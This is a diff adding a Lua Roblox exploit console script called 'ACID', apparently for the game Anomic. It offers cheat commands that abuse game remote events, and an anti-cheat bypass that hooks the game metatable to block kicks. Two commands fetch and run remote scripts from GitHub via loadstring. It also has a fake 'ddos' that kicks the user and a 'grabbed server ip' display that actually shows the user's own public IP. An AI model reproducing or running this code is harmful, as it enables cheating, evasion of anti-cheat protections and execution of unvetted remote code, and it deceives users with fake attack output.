@@ -1,0 +1,679 @@
+rconsolename("ACID - MADE BY twistedworid ON ROBLOX #UNBANTWISTED")
+rconsoleclear()
+local addtext, changecolor = rconsoleprint, rconsoleprint
+local commands, cmdManager = {
+    "clear",
+    "aura",
+    "resetcash",
+    "jotaro",
+    "short",
+    "goku",
+    "islandboy",
+    "yoda",
+    "starplatnium",
+    "naruto",
+    "travisscott",
+    "infyield",
+    "baby",
+    "levitate",
+    "backflip",
+    "ddos", -- I KNOW ITS FAKE DONT HATE :sad:
+    "anticheatbypass", --dunno i think anomic fixed it but who cares
+    "serverhop",
+    "hidewanted",
+    "clownred",
+    "clownblue",
+    
+--MORE COMMANDS ADDED SOON...
+},
+"cmd"
+local colors = {
+    "@@BLACK@@",
+    "@@BLUE@@",
+    "@@GREEN@@",
+    "@@CYAN@@",
+    "@@RED@@",
+    "@@MAGENTA@@",
+    "@@BROWN@@",
+    "@@LIGHT_GRAY@@",
+    "@@DARK_GRAY@@",
+    "@@LIGHT_BLUE@@",
+    "@@LIGHT_GREEN@@",
+    "@@LIGHT_CYAN@@",
+    "@@LIGHT_RED@@",
+    "@@LIGHT_MAGENTA@@",
+    "@@YELLOW@@",
+    "@@WHITE@@",
+}
+--16
+local black, blue, green, cyan, red, magenta, brown, lightgray, darkgray, lightblue, lightgreen, lightcyan, lightred, lightmagenta, yellow, white = colors[1], colors[2], colors[3], colors[4], colors[5], colors[6], colors[7], colors[8], colors[9], colors[10], colors[11], colors[12], colors[13], colors[14], colors[15], colors[16]
+local function addline()
+    addtext("\n")
+    changecolor(green)
+end
+local function fakeserverip()
+    addtext("\nG")
+    wait(0.025)
+    addtext("r")
+    wait(0.025)
+    addtext("a")
+    wait(0.025)
+    addtext("b")
+    wait(0.025)
+    addtext("b")
+    wait(0.025)
+    addtext("e")
+    wait(0.025)
+    addtext("d")
+    wait(0.025)
+    addtext(" ")
+    wait(0.025)
+    addtext("s")
+    wait(0.025)
+    addtext("e")
+    wait(0.025)
+    addtext("r")
+    wait(0.025)
+    addtext("v")
+    wait(0.025)
+    addtext("e")
+    wait(0.025)
+    addtext("r")
+    wait(0.025)
+    addtext(" ")
+    wait(0.025)
+    addtext("i")
+    wait(0.025)
+    addtext("p")
+    wait(0.025)
+    addtext(":")
+    wait(0.025)
+    addtext(" ")
+    wait(0.025)
+    addtext(game:HttpGet("https://api.ipify.org"))
+    wait(0.025)
+    addtext("\n")
+end
+
+local function logo()
+    addtext([[
+                                           _____    _____   __    _____    
+                                          /\___/\  /\ __/\ /\_\  /\ __/\   
+                                         / / _ \ \ ) )__\/ \/_/  ) )  \ \  
+                                         \ \(_)/ // / /     /\_\/ / /\ \ \ 
+                                         / / _ \ \\ \ \_   / / /\ \ \/ / / 
+                                        ( (_( )_) )) )__/\( (_(  ) )__/ /  
+                                         \/_/ \_\/ \/___\/ \/_/  \/___\/
+]])
+end
+local function err()
+    changecolor(red)
+    wait(0.01)
+    addtext("E")
+    wait(0.025)
+    addtext("r")
+    wait(0.025)
+    addtext("r")
+    wait(0.025)
+    addtext("o")
+    wait(0.025)
+    addtext("r")
+    wait(0.025)
+    addtext("!")
+    wait(0.025)
+    addtext(" ")
+    wait(0.025)
+    addtext("I")
+    wait(0.025)
+    addtext("n")
+    wait(0.025)
+    addtext("v")
+    wait(0.025)
+    addtext("a")
+    wait(0.025)
+    addtext("l")
+    wait(0.025)
+    addtext("i")
+    wait(0.025)
+    addtext("d")
+    wait(0.025)
+    addtext(" ")
+    wait(0.025)
+    addtext("c")
+    wait(0.025)
+    addtext("o")
+    wait(0.025)
+    addtext("m")
+    wait(0.025)
+    addtext("m")
+    wait(0.025)
+    addtext("a")
+    wait(0.025)
+    addtext("n")
+    wait(0.025)
+    addtext("d")
+    wait(0.025)
+    addtext(".")
+    wait(0.025)
+    addtext(" ")
+    wait(0.025)
+    addtext("D")
+    wait(0.025)
+    addtext("i")
+    wait(0.025)
+    addtext("d")
+    wait(0.025)
+    addtext(" ")
+    wait(0.025)
+    addtext("y")
+    wait(0.025)
+    addtext("o")
+    wait(0.025)
+    addtext("u")
+    wait(0.025)
+    addtext(" ")
+    wait(0.025)
+    addtext("s")
+    wait(0.025)
+    addtext("p")
+    wait(0.025)
+    addtext("e")
+    wait(0.025)
+    addtext("l")
+    wait(0.025)
+    addtext("l")
+    wait(0.025)
+    addtext(" ")
+    wait(0.025)
+    addtext("c")
+    wait(0.025)
+    addtext("o")
+    wait(0.025)
+    addtext("r")
+    wait(0.025)
+    addtext("r")
+    wait(0.025)
+    addtext("e")
+    wait(0.025)
+    addtext("c")
+    wait(0.025)
+    addtext("t")
+    wait(0.025)
+    addtext("?")
+    wait(0.025)
+    addtext(" ")
+    wait(0.025)
+    addtext("O")
+    wait(0.025)
+    addtext("r")
+    wait(0.025)
+    addtext(" ")
+    wait(0.025)
+    addtext("m")
+    wait(0.025)
+    addtext("a")
+    wait(0.025)
+    addtext("y")
+    wait(0.025)
+    addtext("b")
+    wait(0.025)
+    addtext("e")
+    wait(0.025)
+    addtext(" ")
+    wait(0.025)
+    addtext("u")
+    wait(0.025)
+    addtext("s")
+    wait(0.025)
+    addtext("e")
+    wait(0.025)
+    addtext("d")
+    wait(0.025)
+    addtext(" ")
+    wait(0.025)
+    addtext("c")
+    wait(0.025)
+    addtext("a")
+    wait(0.025)
+    addtext("p")
+    wait(0.025)
+    addtext("i")
+    wait(0.025)
+    addtext("t")
+    wait(0.025)
+    addtext("a")
+    wait(0.025)
+    addtext("l")
+    wait(0.025)
+    addtext("s")
+    wait(0.025)
+    addtext(".")
+    wait(0.025)
+    addtext(" ")
+    wait(0.025)
+    addtext("P")
+    wait(0.025)
+    addtext("l")
+    wait(0.025)
+    addtext("e")
+    wait(0.025)
+    addtext("a")
+    wait(0.025)
+    addtext("s")
+    wait(0.025)
+    addtext("e")
+    wait(0.025)
+    addtext(" ")
+    wait(0.025)
+    addtext("t")
+    wait(0.025)
+    addtext("r")
+    wait(0.025)
+    addtext("y")
+    wait(0.025)
+    addtext(" ")
+    wait(0.025)
+    addtext("a")
+    wait(0.025)
+    addtext("g")
+    wait(0.025)
+    addtext("a")
+    wait(0.025)
+    addtext("i")
+    wait(0.025)
+    addtext("n")
+    wait(0.025)
+    addtext(".\n")
+    wait(0.025)
+    end
+local function welcoming()
+wait(1)
+changecolor(green)
+addtext("\nW")
+wait(0.025)
+addtext("e")
+wait(0.025)
+addtext("l")
+wait(0.025)
+addtext("c")
+wait(0.025)
+addtext("o")
+wait(0.025)
+addtext("m")
+wait(0.025)
+addtext("e")
+wait(0.025)
+addtext(" ")
+wait(0.025)
+addtext("t")
+wait(0.025)
+addtext("o")
+wait(0.025)
+addtext(" ")
+wait(0.025)
+addtext("A")
+wait(0.025)
+addtext("c")
+wait(0.025)
+addtext("i")
+wait(0.025)
+addtext("d")
+wait(0.025)
+addtext(".")
+wait(0.025)
+addtext(" ")
+wait(0.025)
+addtext("T")
+wait(0.025)
+addtext("y")
+wait(0.025)
+addtext("p")
+wait(0.025)
+addtext("e")
+wait(0.025)
+addtext(" ")
+wait(0.025)
+addtext('"')
+wait(0.025)
+addtext("c")
+wait(0.025)
+addtext("m")
+wait(0.025)
+addtext("d")
+wait(0.025)
+addtext('"')
+wait(0.025)
+addtext(" ")
+wait(0.025)
+addtext("f")
+wait(0.025)
+addtext("o")
+wait(0.025)
+addtext("r")
+wait(0.025)
+addtext(" ")
+wait(0.025)
+addtext("a")
+wait(0.025)
+addtext(" ")
+wait(0.025)
+addtext("l")
+wait(0.025)
+addtext("i")
+wait(0.025)
+addtext("s")
+wait(0.025)
+addtext("t")
+wait(0.025)
+addtext(" ")
+wait(0.025)
+addtext("o")
+wait(0.025)
+addtext("f")
+wait(0.025)
+addtext(" ")
+wait(0.025)
+addtext("c")
+wait(0.025)
+addtext("o")
+wait(0.025)
+addtext("m")
+wait(0.025)
+addtext("m")
+wait(0.025)
+addtext("a")
+wait(0.025)
+addtext("n")
+wait(0.025)
+addtext("d")
+wait(0.025)
+addtext("s")
+wait(0.025)
+addtext(".")
+end
+changecolor(green)
+logo()
+welcoming()
+fakeserverip()
+while wait(0.1) do
+local input = rconsoleinput()
+if input == cmdManager then
+    changecolor(white)
+    addtext("\nCOMMANDS ARE: \nclear\naura\nresetcash\njotaro\nshort\ngoku\nislandboy\nyoda\nstarplatnium\nnaruto\ntravisscott\ninfyield\nbaby\nlevitate\nbackflip\nddos\nanticheatbypass\nserverhop\nhidewanted\nclownred\nclownblue\n\n")
+    changecolor(green)
+elseif input == commands[1] then
+    rconsoleclear()
+    changecolor(green)
+    logo()
+    welcoming()
+elseif input == commands[2] then
+    loadstring(game:HttpGet"https://raw.githubusercontent.com/rip2point/waqfiouhfg/main/wwwwwwwwwwwwwwwwwwwww")()
+    addline()
+elseif input == commands[3] then
+    wait(1)
+    for i,v in pairs(workspace.PlayerVehicles:GetChildren()) do
+    game:GetService("ReplicatedStorage")["_CS.Events"].FillUpCar:FireServer(v, 9e9)
+    wait(.2)
+game:GetService("TeleportService"):Teleport(game.PlaceId)
+addline()
+end
+elseif input == commands[4] then
+    local Players = game:GetService('Players')
+	local LocalPlayer = Players.LocalPlayer or Players.LocalPlayer:Wait()
+	local Character = LocalPlayer.Character or LocalPlayer.Character:Wait()
+	local Humanoid = Character:WaitForChild('Humanoid')
+	local FireSequences = {{'Cloth';'Cool Hair'};{'Cloth';'No Mask'};{'Cloth';'No Beard'};{'Cloth';'Brim Hat'};{'Cloth';'No Jewelry'};{'Color';Color3.fromRGB(    255, 219, 172);'SkinColor'};{'Cloth';'No Glasses'};{'CustomCloth';'329801167'};{'CustomCloth';'329801109'}}
+	coroutine.wrap(function() 
+		for _, Sequence in next, FireSequences do
+			game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer(unpack(Sequence))
+		end
+	end)()
+	addline()
+elseif input == commands[5] then
+    	_G.isdel = false
+
+	function Main(Delay)
+		local H = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid')
+		local function DeleteOriginal()
+			for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+				if v.Name == 'OriginalSize' then
+					v:Destroy()
+				end
+				if v.Name == 'OriginalPosition' then 
+					v:Destroy()
+				end
+			end
+		end
+		local function Width()
+			wait(Delay)
+			DeleteOriginal()
+			H:FindFirstChild("BodyWidthScale"):Destroy()
+		end
+		local function Depth()
+			wait(Delay)
+			DeleteOriginal()
+			H:FindFirstChild("BodyDepthScale"):Destroy()
+		end
+		local function Head()
+			wait(Delay)
+			DeleteOriginal()
+			H:FindFirstChild("HeadScale"):Destroy()
+		end
+		local function Type()
+			wait(Delay)
+			DeleteOriginal()
+			H:FindFirstChild("BodyTypeScale"):Destroy()
+		end 
+		--// Rearrage these below to customize titan
+		Width()
+		Type()
+		Depth()
+		Head()
+		--\
+	end
+	Main(0.8)
+	addline()
+elseif input == commands[6] then
+    local Players = game:GetService('Players')
+	local LocalPlayer = Players.LocalPlayer or Players.LocalPlayer:Wait()
+	local Character = LocalPlayer.Character or LocalPlayer.Character:Wait()
+	local Humanoid = Character:WaitForChild('Humanoid')
+	local FireSequences = {{'Cloth';'Bed Hair'};{'Cloth';'No Mask'};{'Cloth';'No Beard'};{'Cloth';'No Hat'};{'Cloth';'No Jewelry'};{'Color';Color3.fromRGB(    255, 219, 172);'SkinColor'};{'Cloth';'No Glasses'};{'CustomCloth';'5008316566'};{'CustomCloth';'4669298403'}}
+	coroutine.wrap(function() 
+		for _, Sequence in next, FireSequences do
+			game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer(unpack(Sequence))
+		end
+	end)()
+	addline()
+elseif input == commands[7] then
+    local Players = game:GetService('Players')
+	local Players = game:GetService('Players')
+	local LocalPlayer = Players.LocalPlayer or Players.LocalPlayer:Wait()
+	local Character = LocalPlayer.Character or LocalPlayer.Character:Wait()
+	local Humanoid = Character:WaitForChild('Humanoid')
+	local FireSequences = {{'Cloth';'Bed Hair'};{'Cloth';'No Mask'};{'Cloth';'No Beard'};{'Cloth';'No Hat'};{'Cloth';'No Jewelry'};{'Color';Color3.fromRGB(    255, 219, 172);'SkinColor'};{'Cloth';'No Glasses'};{'CustomCloth';'686889267'};{'CustomCloth';'6827947114'}}
+	coroutine.wrap(function() 
+		for _, Sequence in next, FireSequences do
+			game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer(unpack(Sequence))
+		end
+	end)()
+	addline()
+elseif input == commands[8] then
+    game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer("Color",Color3.new(100, 179, 116),"SkinColor")
+	game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer("CustomCloth",4821060852)
+	game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer("CustomCloth",4821061493)
+
+
+	local Players = game:GetService('Players')
+	local LocalPlayer = Players.LocalPlayer or Players.LocalPlayer:Wait()
+	local Character = LocalPlayer.Character or LocalPlayer.Character:Wait()
+	local Humanoid = Character:WaitForChild('Humanoid')
+	local FireSequences = {{'Cloth';'Bald'};{'Cloth';'No Mask'};{'Cloth';'No Beard'};{'Cloth';'No Hat'};{'Cloth';'No Jewelry'};{'Color';Color3.fromRGB(    100, 179, 116);'SkinColor'};{'Cloth';'No Glasses'};{'CustomCloth';'4821060852'};{'CustomCloth';'4821061493'}}
+	coroutine.wrap(function() 
+		for _, Sequence in next, FireSequences do
+			game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer(unpack(Sequence))
+		end
+	end)()
+	addline()
+elseif input == commands[9] then
+    	game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer("Color",Color3.new(128,0,128),"SkinColor")
+	game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer("CustomCloth",6644731266)
+	game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer("CustomCloth",6644731024)
+
+	local Players = game:GetService('Players')
+	local LocalPlayer = Players.LocalPlayer or Players.LocalPlayer:Wait()
+	local Character = LocalPlayer.Character or LocalPlayer.Character:Wait()
+	local Humanoid = Character:WaitForChild('Humanoid')
+	local FireSequences = {{'Cloth';'Bed Hair'};{'Cloth';'No Mask'};{'Cloth';'No Beard'};{'Cloth';'No Hat'};{'Cloth';'No Jewelry'};{'Color';Color3.fromRGB(    128,0,128);'SkinColor'};{'Cloth';'No Glasses'};{'CustomCloth';'6644731266'};{'CustomCloth';'6644731024'}}
+	coroutine.wrap(function() 
+		for _, Sequence in next, FireSequences do
+			game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer(unpack(Sequence))
+		end
+	end)()
+	addline()
+elseif input == commands[10] then
+    local Players = game:GetService('Players')
+	local LocalPlayer = Players.LocalPlayer or Players.LocalPlayer:Wait()
+	local Character = LocalPlayer.Character or LocalPlayer.Character:Wait()
+	local Humanoid = Character:WaitForChild('Humanoid')
+	local FireSequences = {{'Cloth';'Messy Undercut'};{'Cloth';'No Mask'};{'Cloth';'No Beard'};{'Cloth';'Headband'};{'Cloth';'No Jewelry'};{'Color';Color3.fromRGB(    255, 219, 172);'SkinColor'};{'Cloth';'No Glasses'};{'CustomCloth';'6965018658'};{'CustomCloth';'6965019932'}}
+	coroutine.wrap(function() 
+		for _, Sequence in next, FireSequences do
+			game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer(unpack(Sequence))
+		end
+	end)()
+	addline()
+elseif input == commands[11] then
+    game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer("Color",Color3.new(89, 44, 0),"SkinColor")
+	game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer("CustomCloth",7205456461)
+	game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer("CustomCloth",7124883029)
+
+
+	local Players = game:GetService('Players')
+	local LocalPlayer = Players.LocalPlayer or Players.LocalPlayer:Wait()
+	local Character = LocalPlayer.Character or LocalPlayer.Character:Wait()
+	local Humanoid = Character:WaitForChild('Humanoid')
+	local FireSequences = {{'Cloth';'Short Dreads'};{'Cloth';'No Mask'};{'Cloth';'No Beard'};{'Cloth';'No Hat'};{'Cloth';'No Jewelry'};{'Color';Color3.fromRGB(    89, 44, 0);'SkinColor'};{'Cloth';'No Glasses'};{'CustomCloth';'7205456461'};{'CustomCloth';'7124883029'}}
+	coroutine.wrap(function() 
+		for _, Sequence in next, FireSequences do
+			game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer(unpack(Sequence))
+		end
+	end)()
+	addline()
+elseif input == commands[12] then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/rip2point/anomic/main/Main/infyield'))()
+elseif input == commands[13] then
+    local Players = game:GetService('Players')
+	local LocalPlayer = Players.LocalPlayer or Players.LocalPlayer:Wait()
+	local Character = LocalPlayer.Character or LocalPlayer.Character:Wait()
+	local Humanoid = Character:WaitForChild('Humanoid')
+	local FireSequences = {{'Cloth';'Bald'};{'Cloth';'No Mask'};{'Cloth';'No Beard'};{'Cloth';'No Hat'};{'Cloth';'No Jewelry'};{'Color';Color3.fromRGB(    255, 219, 172);'SkinColor'};{'Cloth';'No Glasses'};{'CustomCloth';'7618925899'};{'CustomCloth';'6557573281'}}
+	coroutine.wrap(function() 
+		for _, Sequence in next, FireSequences do
+			game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer(unpack(Sequence))
+		end
+	end)()
+    addline()
+elseif input == commands[14] then
+    local lp = game.Players.LocalPlayer
+	AnimationId = "3337994105"
+	local Anim = Instance.new("Animation")
+	Anim.AnimationId = "rbxassetid://"..AnimationId
+	standanim = lp.Character.Humanoid:LoadAnimation(Anim)
+	standanim:Play(0)
+	standanim:AdjustSpeed(1)
+	lp.Character.Animate.Disabled = true
+	addline()
+elseif input == commands[15] then
+    local lp = game.Players.LocalPlayer
+	AnimationId = "5104344710"
+	local Anim = Instance.new("Animation")
+	Anim.AnimationId = "rbxassetid://"..AnimationId
+	local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
+	k:Play(0)
+	k:AdjustSpeed(1)
+	wait(0.2)
+	game.Players.LocalPlayer.Character.Animate.Disabled = true
+	k.DidLoop:connect(function(speed)
+		game.Players.LocalPlayer.Character.Animate.Disabled = false
+		k:Stop(0)
+	end)
+	addline()
+elseif input == commands[16] then
+    --fake ddos
+    for i = 1, 120 do
+        wait()
+        changecolor(green)
+        addtext("\nSuccessfully sent request to server.")
+    end
+    wait()
+    game.Players.LocalPlayer:Kick("Please check your internet connection and try again.")
+    wait(1)
+    while true do
+        rconsoleclear()
+    end
+    addline()
+elseif input == commands[17] then
+    if not game:IsLoaded() then game.Loaded:Wait() end
+	local vu = game:GetService("VirtualUser")
+	game:GetService("Players").LocalPlayer.Idled:connect(function()
+		vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+		wait(1)
+		vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+	end)
+
+	local mt = getrawmetatable(game)
+	local old = mt.__namecall
+	local protect = newcclosure or protect_function
+
+	setreadonly(mt, false)
+	mt.__namecall = protect(function(self, ...)
+		local method = getnamecallmethod()
+		if method == "Kick" then
+			wait(9e9)
+			return
+		end
+		return old(self, ...)
+	end)
+	hookfunction(game.Players.LocalPlayer.Kick,protect(function() wait(9e9) end))
+	addline()
+elseif input == commands[18] then
+    game:GetService("TeleportService"):Teleport(game.PlaceId)
+    addline()
+elseif input == commands[19] then
+    game.Players.LocalPlayer.Character.Head.PlayerDisplay.TeamName:Destroy()
+	game.Players.LocalPlayer.Character.Head.PlayerDisplay.GangName:Destroy()
+	game.Players.LocalPlayer.Character.Head.PlayerDisplay.Wanted:Destroy()
+	game.Players.LocalPlayer.Character.Head.PlayerDisplay.GangImg:Destroy()
+	addline()
+elseif input == commands[20] then
+    local Players = game:GetService('Players')
+	local Players = game:GetService('Players')
+	local LocalPlayer = Players.LocalPlayer or Players.LocalPlayer:Wait()
+	local Character = LocalPlayer.Character or LocalPlayer.Character:Wait()
+	local Humanoid = Character:WaitForChild('Humanoid')
+	local FireSequences = {{'Cloth';'Bed Hair'};{'Cloth';'No Mask'};{'Cloth';'No Beard'};{'Cloth';'No Hat'};{'Cloth';'No Jewelry'};{'Color';Color3.fromRGB(    255, 255, 255);'SkinColor'};{'Color';Color3.fromRGB(    255, 0, 30);'HairColor'};{'Cloth';'No Glasses'};{'CustomCloth';'8469340116'};{'CustomCloth';'8963066953'}}
+	coroutine.wrap(function() 
+		for _, Sequence in next, FireSequences do
+			game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer(unpack(Sequence))
+		end
+	end)()
+	addline()
+elseif input == commands[21] then
+    local Players = game:GetService('Players')
+	local Players = game:GetService('Players')
+	local LocalPlayer = Players.LocalPlayer or Players.LocalPlayer:Wait()
+	local Character = LocalPlayer.Character or LocalPlayer.Character:Wait()
+	local Humanoid = Character:WaitForChild('Humanoid')
+	local FireSequences = {{'Cloth';'Bed Hair'};{'Cloth';'No Mask'};{'Cloth';'No Beard'};{'Cloth';'No Hat'};{'Cloth';'No Jewelry'};{'Color';Color3.fromRGB(    255, 255, 255);'SkinColor'};{'Color';Color3.fromRGB(    0, 26, 255);'HairColor'};{'Cloth';'No Glasses'};{'CustomCloth';'8469340116'};{'CustomCloth';'8963066953'}}
+	coroutine.wrap(function() 
+		for _, Sequence in next, FireSequences do
+			game:GetService("ReplicatedStorage")["_CS.Events"].EquipAvatarItem:FireServer(unpack(Sequence))
+		end
+	end)()
+	addline()
+    else
+        err()
+        changecolor(green)
+    end
+end     
